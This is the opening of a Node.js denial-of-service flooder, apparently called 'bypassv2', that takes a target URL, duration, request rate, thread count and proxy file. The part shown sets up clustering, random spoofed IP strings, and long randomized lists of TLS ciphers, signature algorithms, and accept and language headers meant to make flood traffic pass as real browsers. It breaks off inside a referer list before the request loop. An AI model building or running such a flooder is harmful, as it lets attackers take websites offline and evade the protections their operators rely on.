const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
 const fakeUA = require('fake-useragent');
 var colors = require('colors');
 const { HeaderGenerator } = require('header-generator');
 tls.DEFAULT_ECDH_CURVE;

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: node bypassv2 target time rate thread proxyfile`.rainbow); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(_0xcdc8x17) {
   var _0xcdc8x18 = "";
   var _0xcdc8x19 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   var _0xcdc8x1a = _0xcdc8x19.length;
   for (var _0xcdc8x1b = 0; _0xcdc8x1b < _0xcdc8x17; _0xcdc8x1b++) {
     _0xcdc8x18 += _0xcdc8x19.charAt(Math.floor(Math.random() * _0xcdc8x1a));
   }
   ;
   return _0xcdc8x18;
 }
 
 const ip_spoof = () => {
   const _0xcdc8x15 = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${""}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${""}`;
 };
 const spoofed = ip_spoof();
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }
let headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "chrome", minVersion: 80, maxVersion: 107, httpVersion: "2"},
    ],
    devices: [
        "desktop",
    ],
    operatingSystems: [
        "windows",
    ],
    locales: ["en-US", "en"]
});
let randomHeaders = headerGenerator.getHeaders();
 const sig = [
    "ecdsa_secp256r1_sha256", 
    "ecdsa_secp384r1_sha384", 
    "ecdsa_secp521r1_sha512",
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    'ecdsa_brainpoolP256r1tls13_sha256',
    'ecdsa_brainpoolP384r1tls13_sha384',
    'ecdsa_brainpoolP512r1tls13_sha512',
    'ecdsa_sha1',
    'ed25519',
    'ed448',
    'ecdsa_sha224',
    'rsa_pkcs1_sha1',
    'rsa_pss_pss_sha256',
    'dsa_sha256',
    'dsa_sha384',
    'dsa_sha512',
    'dsa_sha224',
    'dsa_sha1',
    'rsa_pss_pss_sha384',
    'rsa_pkcs1_sha2240',
    'rsa_pss_pss_sha512',
    'sm2sig_sm3',
    'ecdsa_secp521r1_sha512',
    "rsa_pss_rsae_sha256", 
    "rsa_pss_rsae_sha384", 
    "rsa_pss_rsae_sha512", 
    "rsa_pkcs1_sha256", 
    "rsa_pkcs1_sha384", 
    "rsa_pkcs1_sha512"
    ];
 const cplist = [
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
     "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384", "ECDHE-ECDSA-AES128-SHA", "ECDHE-RSA-AES128-SHA", "AES128-GCM-SHA256", "AES128-SHA256", "AES128-SHA", "ECDHE-RSA-AES256-SHA", "AES256-GCM-SHA384", "AES256-SHA256", "AES256-SHA",
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",

  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
  
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
  
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
  
  
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
     "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
 ];
 const accept_header = [
       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
  
 ]; 
 const lang_header = [
     "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", 
     "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", 
     "en-US,en;q=0.5", "en-US,en;q=0.9", 
     "de-CH;q=0.7", 
     "da, en-gb;q=0.8, en;q=0.7", 
     "cs;q=0.5",
     'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'te;q=0.9,en-US;q=0.8,en;q=0.7',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
 ];
 const encoding_header = [
     "deflate, gzip, br", 
     "gzip", "deflate", 
    'compress, gzip',
    'gzip, identity',
    '*'
 ];
 const control_header = [
     "no-cache", 
     "max-age=0",
    'must-revalidate',
    'public',
   'no-transform',
    's-maxage=86400',
    'only-if-cached',
    'no-store', 
    'must-revalidate',
    'proxy-revalidate'
 ];
 const refers = [
     "http://anonymouse.org/cgi-bin/anon-www.cgi/",
     "http://coccoc.com/search#query=",
     "http://ddosvn.somee.com/f5.php?v=",
